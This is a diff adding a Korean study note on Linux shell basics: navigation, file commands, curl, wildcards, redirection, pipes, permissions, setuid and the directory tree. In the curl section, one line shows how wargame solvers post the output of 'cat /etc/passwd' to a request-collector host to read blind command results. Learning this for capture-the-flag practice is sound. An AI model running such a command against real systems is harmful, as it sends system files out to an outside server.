@@ -1,0 +1,635 @@
+### 셸(Shell)
+- 셸은 유저가 리눅스 시스템을 이용할 수 있는 인터페이스입니다.
+- 셸은 유저에게 입력을 받고 운영체제가 그것을 프로그램으로 처리하면 그 결과를 유저에게 출력합니다.
+
+* ctrl + alt + T (터미널 실행)
+
+### 셸 프롬프트(Shell Prompt)
+(ex.) user@user-VirtualBox:~$
+- 유저는 셸 프롬포트를 보고 셸이 명령어를 입력 받을 준비가 되었음을 알 수 있음.
+
+* id 명령어
+1 user@user-VirtualBox:~$ id
+2 uid=1000(user) gid=1000(user) groups=1000(user),4
+3 user@user-VirtualBox:~$
+
+- id 명렁어를 입력하면 유저의 유저id와 해당 유저가 속해 있는 그룹id를 보여줌.
+
+### 기초적인 명령어
+
+#sudo apt update
+- apt명령어로 설치 가능한 소프트웨어 패키지 목록을 업데이트합니다.
+
+user@user-VirtualBox:~$ sudo apt update
+[sudo] password for user:
+Get:1 http://security.ubuntu.com/ubuntu jammy-security InRelease [110 kB]
+Hit:2 http://kr.archive.ubuntu.com/ubuntu jammy InRelease
+Hit:3 http://kr.archive.ubuntu.com/ubuntu jammy-updates InRelease
+Hit:4 http://kr.archive.ubuntu.com/ubuntu jammy-backports InRelease
+Fetched 110 kB in 2s (60.0 kB/s)
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+3 packages can be upgraded. Run 'apt list --upgradable' to see them.
+user@user-VirtualBox:~$
+
+#sudo apt upgrade
+- 리눅스에 설치된 소프트웨어 패키지의 버전을 업그레이드합니다.
+
+user@user-VirtualBox:~$ sudo apt upgrade
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+Calculating upgrade... Done
+The following packages were automatically installed and are no longer required:
+  libflashrom1 libftdi1-2 linux-headers-5.15.0-43
+  linux-headers-5.15.0-43-generic linux-image-5.15.0-43-generic
+  linux-modules-5.15.0-43-generic linux-modules-extra-5.15.0-43-generic
+Use 'sudo apt autoremove' to remove them.
+#
+# News about significant security updates, features and services will
+# appear here to raise awareness and perhaps tease /r/Linux ;)
+# Use 'pro config set apt_news=false' to hide this and future APT news.
+#
+The following packages have been kept back:
+  libglib2.0-0 libglib2.0-bin libglib2.0-data
+0 upgraded, 0 newly installed, 0 to remove and 3 not upgraded.
+user@user-VirtualBox:~$
+
+#pwd
+- Print Working Directory의 줄임말로 현재 작업 중인 디렉토리의 경로를 출력합니다.
+
+user@user-VirtualBox:~$ pwd
+/home/user
+user@user-VirtualBox:~$
+
+#ls
+- List의 줄임말로 디렉토리의 내용을 출력하는 명령어입니다.
+
+user@user-VirtualBox:~$ ls
+Desktop  Documents  Downloads  Music  Pictures  Public  snap  Templates  Videos
+user@user-VirtualBox:~$
+
+- -l플래그를 추가한 형태인 ls -l을 실행하면 다음과 같이 더 자세한 정보를 함께 출력합니다.
+
+user@user-VirtualBox:~$ ls -l
+total 36
+drwxr-xr-x 2 user user 4096 11월 30 18:46 Desktop
+drwxr-xr-x 2 user user 4096 11월 30 18:46 Documents
+drwxr-xr-x 2 user user 4096 11월 30 18:46 Downloads
+drwxr-xr-x 2 user user 4096 11월 30 18:46 Music
+drwxr-xr-x 2 user user 4096 11월 30 18:46 Pictures
+drwxr-xr-x 2 user user 4096 11월 30 18:46 Public
+drwx------ 3 user user 4096 11월 30 18:45 snap
+drwxr-xr-x 2 user user 4096 11월 30 18:46 Templates
+drwxr-xr-x 2 user user 4096 11월 30 18:46 Videos
+user@user-VirtualBox:~$
+
+- 현재 디렉토리 뿐만 아니라 임의 디렉토리의 내용을 출력하는 것도 가능합니다.
+- 루트 디렉토리인 /디렉토리의 내용을 출력하는 ls -l /을 실행하면 다음과 같습니다.
+
+user@user-VirtualBox:~$ ls -l /
+total 3991632
+lrwxrwxrwx   1 root root          7 11월 30 18:15 bin -> usr/bin
+drwxr-xr-x   4 root root       4096 12월  1 14:10 boot
+drwxrwxr-x   2 root root       4096 11월 30 18:25 cdrom
+drwxr-xr-x  19 root root       4180 12월  1 14:25 dev
+drwxr-xr-x 130 root root      12288 12월  1 14:09 etc
+drwxr-xr-x   3 root root       4096 11월 30 18:27 home
+lrwxrwxrwx   1 root root          7 11월 30 18:15 lib -> usr/lib
+lrwxrwxrwx   1 root root          9 11월 30 18:15 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root          9 11월 30 18:15 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root         10 11월 30 18:15 libx32 -> usr/libx32
+drwx------   2 root root      16384 11월 30 18:14 lost+found
+drwxr-xr-x   3 root root       4096 11월 30 19:49 media
+drwxr-xr-x   2 root root       4096  8월  9 20:48 mnt
+drwxr-xr-x   3 root root       4096 11월 30 19:55 opt
+dr-xr-xr-x 260 root root          0 12월  1 14:11 proc
+drwx------   4 root root       4096 12월  1 14:17 root
+drwxr-xr-x  34 root root        920 12월  1 18:01 run
+lrwxrwxrwx   1 root root          8 11월 30 18:15 sbin -> usr/sbin
+drwxr-xr-x  11 root root       4096  8월  9 20:55 snap
+drwxr-xr-x   2 root root       4096  8월  9 20:48 srv
+-rw-------   1 root root 4087349248 11월 30 18:15 swapfile
+dr-xr-xr-x  13 root root          0 12월  1 14:11 sys
+drwxrwxrwt  21 root root       4096 12월  1 18:01 tmp
+drwxr-xr-x  14 root root       4096  8월  9 20:48 usr
+drwxr-xr-x  14 root root       4096  8월  9 20:54 var
+user@user-VirtualBox:~$
+
+#cd
+-Chagne Directory의 줄임말로 작업중인 디렉토리를 변경하는 명령어입니다.
+
+*절대경로: 루트 디렉토리 /를 시작으로 모든 경로를 적어서 표현하는 경로
+ex. /home/user
+*상대경로: 현재 디렉토리를 기준으로 상위 디렉토리 또는 하위 디렉토리로 뻗어 나가는 경로
+(ex.) cd.. -> 현재 디렉토리에서 부모 디렉토리로 이동
+*고유한 경로:
+1. ~는 현재 유저의 홈 디렉토리
+2. -는 이전에 위치했던 디렉토
+
+user@user-VirtualBox:~$ pwd
+/home/user
+user@user-VirtualBox:~$ cd /
+user@user-VirtualBox:/$ pwd
+/
+user@user-VirtualBox:/$ cd /home/user
+user@user-VirtualBox:~$ pwd
+/home/user
+user@user-VirtualBox:~$ cd ..
+user@user-VirtualBox:/home$ pwd
+/home
+user@user-VirtualBox:/home$ cd ~
+user@user-VirtualBox:~$ pwd
+/home/user
+user@user-VirtualBox:~$
+
+#mkdir
+- Make Directory의 줄임말로 디렉토리를 생성하는 명령어
+
+user@user-VirtualBox:~$ pwd
+/home/user
+user@user-VirtualBox:~$ ls -l
+total 36
+drwxr-xr-x 2 user user 4096 11월 30 18:46 Desktop
+drwxr-xr-x 2 user user 4096 11월 30 18:46 Documents
+drwxr-xr-x 2 user user 4096 11월 30 18:46 Downloads
+drwxr-xr-x 2 user user 4096 11월 30 18:46 Music
+drwxr-xr-x 2 user user 4096 11월 30 18:46 Pictures
+drwxr-xr-x 2 user user 4096 11월 30 18:46 Public
+drwx------ 3 user user 4096 11월 30 18:45 snap
+drwxr-xr-x 2 user user 4096 11월 30 18:46 Templates
+drwxr-xr-x 2 user user 4096 11월 30 18:46 Videos
+user@user-VirtualBox:~$
+
+#touch
+- 비어 있는 새로운 파일을 만드는 명령어
+
+user@user-VirtualBox:~/new_dir$ touch new_file
+user@user-VirtualBox:~/new_dir$ ls -l
+total 0
+-rw-rw-r-- 1 user user 0 12월  1 20:59 new_file
+user@user-VirtualBox:~/new_dir$
+
+#mv
+- Move의 줄임말로 파일이나 디렉토리의 위치를 옮길 때 사용하는 명령어입니다.
+- 파일이나 디렉토리의 이름을 변경 때에도 사용할 수 있습니다.
+
+*이름 변경
+user@user-VirtualBox:~/new_dir$ ls -l
+total 0
+-rw-rw-r-- 1 user user 0 12월  1 20:59 new_file
+user@user-VirtualBox:~/new_dir$ mv new_file old_file 
+user@user-VirtualBox:~/new_dir$
+
+*위치 변경
+user@user-VirtualBox:~/new_dir$ ls
+old_file
+user@user-VirtualBox:~/new_dir$ ls ..
+Desktop    Downloads  new_dir   Public  Templates
+Documents  Music      Pictures  snap    Videos
+user@user-VirtualBox:~/new_dir$ mv old_file ..
+user@user-VirtualBox:~/new_dir$ ls
+user@user-VirtualBox:~/new_dir$ ls ..
+Desktop    Downloads  new_dir   Pictures  snap       Videos
+Documents  Music      old_file  Public    Templates
+user@user-VirtualBox:~/new_dir$
+
+#rm
+- Remove의 줄임말로 파일이나 디렉토리를 삭제하는 명령어
+
+user@user-VirtualBox:~/new_dir$ touch abcd
+user@user-VirtualBox:~/new_dir$ ls -l
+total 0
+-rw-rw-r-- 1 user user 0 12월  2 11:05 abcd
+user@user-VirtualBox:~/new_dir$ rm abcd
+user@user-VirtualBox:~/new_dir$ ls -l
+total 0
+user@user-VirtualBox:~/new_dir$
+
+- 디렉토리 삭제는 -r플래그를  추가한 rm -r로 수행할 수 있습니다.
+user@user-VirtualBox:~/new_dir$ mkdir dir
+user@user-VirtualBox:~/new_dir$ ls -l
+total 4
+drwxrwxr-x 2 user user 4096 12월  2 11:11 dir
+user@user-VirtualBox:~/new_dir$ rm -r dir
+user@user-VirtualBox:~/new_dir$ ls -l
+total 0
+user@user-VirtualBox:~/new_dir$
+
+#cat
+- 파일의 내용을 출력하는 명령어입니다.
+- cat 파일경로 형식으로 사용할 수 있음.
+
+user@user-VirtualBox:~/new_dir$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+... (생략)
+user:x:1000:1000:user,,,:/home/user:/bin/bash
+fwupd-refresh:x:128:136:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+vboxadd:x:999:1::/var/run/vboxadd:/bin/false
+user@user-VirtualBox:~/new_dir$
+
+#file
+- 파일의 유형을 출력하는 명령어
+- file 파일경로 형식으로 사용할 수 있음.
+
+user@user-VirtualBox:~$ file /bin/ls
+/bin/ls: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=897f49cafa98c11d63e619e7e40352f855249c13, for GNU/Linux 3.2.0, stripped
+user@user-VirtualBox:~$
+
+#echo
+- 셸에 유저가 입력한 텍스트를 출력합니다.
+
+user@user-VirtualBox:~/new_dir$ echo "Hello world!"
+Hello world!
+user@user-VirtualBox:~/new_dir$
+
+- echo 명령어를 사용해서 파일을 생성할 수도 있습니다.
+- echo > 파일명 을 실행하면 파일명을 이름으로 파일을 생성하고 echo뒤에 입력한 내용을 파일 내용으로 저장함
+
+user@user-VirtualBox:~/new_dir$ ls -l
+total 0
+user@user-VirtualBox:~/new_dir$ echo "Hello world!" > hello
+user@user-VirtualBox:~/new_dir$ ls -l
+total 4
+-rw-rw-r-- 1 user user 13 12월  2 13:05 hello
+user@user-VirtualBox:~/new_dir$ cat hello
+Hello world!
+user@user-VirtualBox:~/new_dir$
+
+#cp
+- Copy의 줄임말로 파일이나 디렉토리를 복사하는 명령어입니다.
+- 디렉토리를 복사할 때는 -r 플래그를 붙인 형태인 cp -r을 사용
+
+user@user-VirtualBox:~/new_dir$ ls -l
+total 4
+-rw-rw-r-- 1 user user 13 12월  2 13:05 hello
+user@user-VirtualBox:~/new_dir$ cp hello world
+user@user-VirtualBox:~/new_dir$ ls -l
+total 8
+-rw-rw-r-- 1 user user 13 12월  2 13:05 hello
+-rw-rw-r-- 1 user user 13 12월  2 13:08 world
+user@user-VirtualBox:~/new_dir$ cat world
+Hello world!
+user@user-VirtualBox:~/new_dir$
+
+#grep
+- 전체에는 특정 문자열을 찾을 때 사용합니다.
+- grep 문자열 파일 형식으로 사용할 수 있습니다.
+
+user@user-VirtualBox:~/new_dir$ grep root /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+nm-openvpn:x:121:127:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
+
+#man
+- Manual의 줄임말로 특정 명령어의 매뉴얼을 보여주는 명령어입니다.
+- 매뉴얼은 명령어 사용법, 옵션, 예제 등 유용한 정보를 담고 있습니다.
+
+CP(1)                            User Commands                           CP(1)
+​
+NAME
+       cp - copy files and directories
+​
+SYNOPSIS
+       cp [OPTION]... [-T] SOURCE DEST
+       cp [OPTION]... SOURCE... DIRECTORY
+       cp [OPTION]... -t DIRECTORY SOURCE...
+​
+DESCRIPTION
+       Copy SOURCE to DEST, or multiple SOURCE(s) to DIRECTORY.
+​
+       Mandatory  arguments  to  long  options are mandatory for short options
+       too.
+​
+       -a, --archive
+              same as -dR --preserve=all
+​
+       --attributes-only
+              don't copy the file data, just the attributes
+​
+       --backup[=CONTROL]
+ Manual page cp(1) line 1 (press h for help or q to quit)
+
+#curl
+- client URL의 줄임말로 서버에 데이터를 보내거나 서버로부터 데이터를 받는 데이터 전송 명령어
+- curl [옵션] URL 형식으로 사용(HTTP, HTTPS, FTP 등 다양한 프로토콜 지원)
+
+user@user-VirtualBox:~$ curl https://www.google.com
+<!doctype html><html itemscope="" itemtype="http://schema.org/WebPage" lang="ko"> 
+... (생략)
+user@user-VirtualBox:~$
+
+*curl명령어의 주요 옵션
+1. -o file : 전송 받은 데이터를 파일에 저장
+2. -i : 결과 값에 HTTP 응답 헤더를 포함
+3. -X "method" : HTTP 요청 메소드를 지정
+4. -d "key=value" : HTTP POST 메소드로 데이터를 전송합니다.
+
+*curl을 이용한 명령어 실행 결과 전송
+- curl은 워게임 문제를 풀 때도 유용하게 사용합니다.
+- 풀이자가 명령어 실행 결과를 볼 수 없는 경우, 경과를 curl명령어에 포함하여 웹 서버로 전송하면 확인이 가
+
+$ curl "https://hmqtzgx.request.dreamhack.games" -d "`cat /etc/passwd`"
+
+### 와일드 카드
+- 와일드카드(Wildcards)는 리눅스에서 임의의 다른 문자를 나타낼 수 있는 특수 문자들을 의미합니다.
+- 주로 명령어를 다른 문자열로 대체하기 위해 사용합니다.
+
+? -> a-z, 0-9 범위 내 임의의 1개 문자로 대체됩니다.
+
+user@user-VirtualBox:~/new_dir$ ls -l
+total 8
+-rw-rw-r-- 1 user user 13 12월  2 13:05 hello
+-rw-rw-r-- 1 user user 13 12월  2 13:08 world
+user@user-VirtualBox:~/new_dir$ cat he?lo
+Hello world!
+user@user-VirtualBox:~/new_dir$
+
+* -> a-z, 0-9 범위 내 임의의 0개 이 문자로 대체됩니다.
+
+user@user-VirtualBox:~/new_dir$ cat h*
+Hello world!
+user@user-VirtualBox:~/new_dir$ 
+
+[] -> [문자1-문자2] 혹은 [문자1, 문자2, ...] 형태로 범위를 지정합니다. 범위 내 모든 문자로 대체 될 수 있
+
+user@user-VirtualBox:~/new_dir$ ls -l
+total 8
+-rw-rw-r-- 1 user user 13 12월  2 13:05 hello
+-rw-rw-r-- 1 user user 13 12월  2 13:08 world
+user@user-VirtualBox:~/new_dir$ touch test1 test2 test3
+user@user-VirtualBox:~/new_dir$ ls -l
+total 8
+-rw-rw-r-- 1 user user 13 12월  2 13:05 hello
+-rw-rw-r-- 1 user user  0 12월  2 13:10 test1
+-rw-rw-r-- 1 user user  0 12월  2 13:10 test2
+-rw-rw-r-- 1 user user  0 12월  2 13:10 test3
+-rw-rw-r-- 1 user user 13 12월  2 13:08 world
+user@user-VirtualBox:~/new_dir$ ls test[0-9]
+test1  test2  test3
+user@user-VirtualBox:~/new_dir$ 
+
+###리다이렉션
+- 리다이렉션(redirection)은 모니터에 나타나는 표준 출력 호근 키보드로 입력하는 표준 입력을 다른 곳으로 변경하는 작업입니다.
+- 주로 어떤 명령어의 결과를 파일로 저장하거나, 다른 명령어의 입력으로 전달하는 형태로 리다이렉션합니다.
+
+#명령어>파일
+- 명령어 표준 출력을 파일로 변경합니다.
+- 파일이 없으면 새로 만들고, 있으면 덮어씁니다.
+
+user@user-VirtualBox:~/new_dir$ ls test[0-9]
+test1  test2  test3
+user@user-VirtualBox:~/new_dir$ ls test[0-9] > world
+user@user-VirtualBox:~/new_dir$ cat world
+test1
+test2
+test3
+user@user-VirtualBox:~/new_dir$
+
+#명령어>>파일
+- 명령어 표준 출력을 파일로 변경합니다.
+- 파일이 없으면 새로 만들고, 있으면 이어서 씁니다.
+
+user@user-VirtualBox:~/new_dir$ cat hello
+hello
+user@user-VirtualBox:~/new_dir$ cat hello >> world
+user@user-VirtualBox:~/new_dir$ cat world
+test1
+test2
+test3
+hello
+user@user-VirtualBox:~/new_dir$
+
+#명령어<파일
+- 명령어 표준 입력을 파일로 변경합니다.
+- 파일로부터 표준 입력을 받아 명령어로 수행합니다.
+
+user@user-VirtualBox:~/new_dir$ cat world
+test1
+test2
+test3
+hello
+user@user-VirtualBox:~/new_dir$ grep test < world
+test1
+test2
+test3
+user@user-VirtualBox:~/new_dir$
+
+###파이프
+- 파이프(pipe)는 리다이렉션의 한 형태로, 명령어 결과 표준 출력을 다른 명령어의 표준 입력으로 보낼 때 사용합니다.
+- 파이프는 | 문자로 나타냅니다.
+
+user@user-VirtualBox:~/new_dir$ ls -l
+total 8
+-rw-rw-r-- 1 user user 13 12월  2 13:05 hello
+-rw-rw-r-- 1 user user  0 12월  2 13:10 test1
+-rw-rw-r-- 1 user user  0 12월  2 13:10 test2
+-rw-rw-r-- 1 user user  0 12월  2 13:10 test3
+-rw-rw-r-- 1 user user 13 12월  2 13:08 world
+user@user-VirtualBox:~/new_dir$ ls -l | grep hello
+-rw-rw-r-- 1 user user 13 12월  2 13:05 hello
+user@user-VirtualBox:~/new_dir$ 
+
+###권환
+- 리눅스에서 유저와 그룹은 리눅스의 권환 시스템을 설명하기 위해 빠뜨릴 수 없는 개념입니다.
+- 리눅스의 각 유저는 이름과 고유한 사용자ID(UID)를 가지고 있습니다.
+- 그룹은 여러 유저가 속할 수 있는 그룹으로, 이 역시 그룹 이름과 고유한 그룹ID(GID)를 가지고 있습니다.
+
+# 파일 및 디렉토리 권환
+- 리눅스는 사용자가 파일과 디렉토리에 접근하는 행위에 대해 권환으로 제어합니다.
+- 각 파일과 디렉토리는 소유자(owner)와 소유 그룹(group)을 가지고 있습니다.
+- 소유자는 파일 또는 디렉토리의 권환을 수정할 수 있습니다..
+
+*읽기(Read) : 파일 또는 디렉토리의 내용을 볼 수 있게 허용합니다.
+*쓰기(Write) : 파일 또는 디렉토리의 내용을 수정하거나 삭제하는 것을 허용합니다.
+*실행(Execute) : 파일이 프로그램인 경우 실행 할 수 있게 허용합니다. 디렉토리의 경우 내용에 접근할 수 있도록 허
+
+user@user-VirtualBox:~/new_dir$ ls -l
+total 12
+drwxrwxr-x 2 user user 4096 12월  2 13:38 dir
+---------- 1 user user   13 12월  2 13:05 hello
+-rwxrw-r-- 1 user user   13 12월  2 13:08 world
+user@user-VirtualBox:~/new_dir$
+
+*첫번째 열은 권환 플래그, 세번째 열은 소유자를 나타냄, 네 번째 열은 소유 그룹을 나타냄
+
+###파일 및 디렉토리 권환 명령어
+#chmod
+- chmod는 파일 권환을 변경하는 명령어입니다.
+- root 혹은 파일의 소유자만 실행할 수 있습니다.
+- 권환 플래그를 10진수로 표현하거나 기존의 권환에 문자를 더하거나 뺍니다
+
+*원래 권환
+user@user-VirtualBox:~/new_dir$ ls -l
+total 12
+drwxrwxr-x 2 user user 4096 12월  2 13:38 dir
+---------- 1 user user   13 12월  2 13:05 hello
+-rwxrw-r-- 1 user user   13 12월  2 13:08 world
+user@user-VirtualBox:~/new_dir$
+
+*수정(10진수)
+user@user-VirtualBox:~/new_dir$ chmod 764 hello
+user@user-VirtualBox:~/new_dir$ ls -l
+total 12
+drwxrwxr-x 2 user user 4096 12월  2 13:38 dir
+-rwxrw-r-- 1 user user   13 12월  2 13:05 hello
+-rwxrw-r-- 1 user user   13 12월  2 13:08 world
+user@user-VirtualBox:~/new_dir$
+
+*수정(권환 더하고 뺴기)
+user@user-VirtualBox:~/new_dir$ chmod g+x hello
+user@user-VirtualBox:~/new_dir$ ls -l
+total 12
+drwxrwxr-x 2 user user 4096 12월  2 13:38 dir
+-rwxrwxr-- 1 user user   13 12월  2 13:05 hello
+-rwxrw-r-- 1 user user   13 12월  2 13:08 world
+user@user-VirtualBox:~/new_dir$ chmod g-wx hello
+user@user-VirtualBox:~/new_dir$ ls -l
+total 12
+drwxrwxr-x 2 user user 4096 12월  2 13:38 dir
+-rwxr--r-- 1 user user   13 12월  2 13:05 hello
+-rwxrw-r-- 1 user user   13 12월  2 13:08 world
+
+#chown
+- chown은 파일 소유자 혹은 소유 그룹을 변경하는 명령어입니다.
+- root유저만 실행 할 수 있습니다.
+- chown 사용자명[.그룹명] 파일명 형식으로 사용합니다. 
+- 소유 그룹만 변경하고 싶은 경우 chgrp명령어를 사용합니다.
+
+*소유자 변
+user@user-VirtualBox:~/new_dir$ ls -l
+total 12
+drwxrwxr-x 2 user user 4096 12월  2 13:38 dir
+-rwxr--r-- 1 user user   13 12월  2 13:05 hello
+-rwxrw-r-- 1 user user   13 12월  2 13:08 world
+user@user-VirtualBox:~/new_dir$ sudo chown root hello
+[sudo] password for user: 
+user@user-VirtualBox:~/new_dir$ ls -l
+total 12
+drwxrwxr-x 2 user user 4096 12월  2 13:38 dir
+-rwxr--r-- 1 root user   13 12월  2 13:05 hello
+-rwxrw-r-- 1 user user   13 12월  2 13:08 world
+user@user-VirtualBox:~/new_dir$ echo "hello" > hello
+bash: hello: Permission denied
+user@user-VirtualBox:~/new_dir$ 
+
+###특수 권환
+
+#setuid
+- 일반 사용자가 파일을 실행하면 파일 소유자 권환으로 실행됩니다.
+- setuid는 소유자가 실행 권환에 x대산 s무자로 나타냅니다.
+- 대문자S로 표시되는 경우에는 setuid가 걸려 있으나, 실행 권환이 없는 경우입니다.
+
+user@user-VirtualBox:/bin$ ls -l passwd
+-rwsr-xr-x 1 root root 59976 11월 24 21:05 passwd
+
+#setgid
+- 일반 사용자가 파일을 실행하면 파일 소유 그룹 권환으로 실행됩니다.
+
+#sticky bit
+- 디렉토리에 sticky bit를 설정하면 파일 및 디렉토리 소유자와 root 사용자 외에 일반 사용자가 파일을 삭제할 수 없습니다.
+- 주로 공용 디렉토리에 사용합니다.
+- 일반 사용자의 실행 권환에 x대신 t문자로 나타냅니다.
+- 실행 권환이 없는 경우에는 대문자 T로 표시됩니다.
+
+* 특수 권환을 지정할 때는 권환 플래그 맨 앞에숫자를 붙여 나타냅니다.
+- setuid는 4, setgid는 2, sticky bit는 1입니다.
+
+user@user-VirtualBox:~/new_dir$ ls -l
+total 12
+drwxrwxr-x 2 user user 4096 12월  2 13:38 dir
+-rwxr--r-- 1 root user   13 12월  2 13:05 hello
+-rwxrw-r-- 1 user user   13 12월  2 13:08 world
+user@user-VirtualBox:~/new_dir$ chmod 4775 world
+user@user-VirtualBox:~/new_dir$ ls -l
+total 12
+drwxrwxr-x 2 user user 4096 12월  2 13:38 dir
+-rwxr--r-- 1 root user   13 12월  2 13:05 hello
+-rwsrwxr-x 1 user user   13 12월  2 13:08 world
+
+###디렉토리 구조
+
+#루트 디렉토리 /
+- 루트 디렉토리는 리눅스의 최상위 디렉토리를 말하며, 절대 경로는 /입니다.
+
+user@user-VirtualBox:~$ ls -l /
+total 3991632
+lrwxrwxrwx   1 root root          7 11월 30 18:15 bin -> usr/bin
+drwxr-xr-x   4 root root       4096 12월  1 14:10 boot
+drwxrwxr-x   2 root root       4096 11월 30 18:25 cdrom
+drwxr-xr-x  19 root root       4180 12월  1 14:25 dev
+drwxr-xr-x 130 root root      12288 12월  1 14:09 etc
+drwxr-xr-x   3 root root       4096 11월 30 18:27 home
+lrwxrwxrwx   1 root root          7 11월 30 18:15 lib -> usr/lib
+lrwxrwxrwx   1 root root          9 11월 30 18:15 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root          9 11월 30 18:15 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root         10 11월 30 18:15 libx32 -> usr/libx32
+drwx------   2 root root      16384 11월 30 18:14 lost+found
+drwxr-xr-x   3 root root       4096 11월 30 19:49 media
+drwxr-xr-x   2 root root       4096  8월  9 20:48 mnt
+drwxr-xr-x   3 root root       4096 11월 30 19:55 opt
+dr-xr-xr-x 257 root root          0 12월  1 14:11 proc
+drwx------   4 root root       4096 12월  1 14:17 root
+drwxr-xr-x  33 root root        900 12월  1 14:12 run
+lrwxrwxrwx   1 root root          8 11월 30 18:15 sbin -> usr/sbin
+drwxr-xr-x  11 root root       4096  8월  9 20:55 snap
+drwxr-xr-x   2 root root       4096  8월  9 20:48 srv
+-rw-------   1 root root 4087349248 11월 30 18:15 swapfile
+dr-xr-xr-x  13 root root          0 12월  1 14:11 sys
+drwxrwxrwt  20 root root       4096 12월  1 14:17 tmp
+drwxr-xr-x  14 root root       4096  8월  9 20:48 usr
+drwxr-xr-x  14 root root       4096  8월  9 20:54 var
+user@user-VirtualBox:~$
+
+#/bin
+- 일반 유저가 사용할 수 있는 기본적인 명령어나 프로그램을 담고 있는 디렉토리입니다.
+
+#/boot
+- 시스템 부팅에 필요한 파일들을 담고 있는 디렉토리입니다.
+
+#/dev
+- 리눅스에서는 컴퓨터에 부착된 물리적인 장치들을 디바이스 드라이버를 거쳐 파일 형태로 접근 가능합니다.
+- 그러한 장치들을 나타내는 파일들을 담고 있는 디렉토리입니다.
+
+#/etc
+- 운영체제나 운영체제 위에서 작동하는 서비스의 설정 파일들을 담고 있는 디렉토리입니다.
+
+#/home
+- 각 일반 유저의 홈 디렉토리를 담고 있는 디렉토리입니다.
+- dream유저의 홈 디렉토리는 /home/dream입니다.
+
+#/lib
+- 시스템에 필요한 라이브러리 파일들을 담고 있는 디렉토리입니다.
+- /bin이나 /sbin에 존재하는 프로그램이 필요로 하는 동적 라이브러리 파일이 /lib에 존재합니다.
+
+#/opt
+- 소프트웨어 패키지들을 담는 디렉토리입니다.
+
+#/proc
+- 리눅스 커널 자원에 접근 할 수 있는 파일과 프로세스를 나타내는 파일을 담고 있습니다.
+
+#/root
+- root유저의 홈 디렉토리입니다.
+
+#/sbin
+- /bin디렉토리와 마찬가지로 기본적인 유저 명령이나 프로그램을 가지고 있는 디렉토리입니다.
+- /sbnin은 root유저가 사용할 수 있는 명령어나 프로그램을 가지고 있습니다.
+
+#/tmp
+- 유저나 프로그램이 임시로 파일을 생성해야할 때 사용 할 수 있는 디렉토리입니다.
+- 본 디렉토리에오래 존재했던 파일들은 자동으로 삭제되므로 주의해서 사용해야 합니다.
+
+#/usr
+- 사용자 바이너리, 문서, 헤더 파일 등을 담고 있는 디렉토리입니다.
+
+#/var
+- 프로그램이나 시스템이 실시간으로 가변적인 파일을 사용하고 저장해야 할 떄 활용하는 디렉토리입니다.
+- /var/log에는 다양한 로그 파일이 저장됩니다.
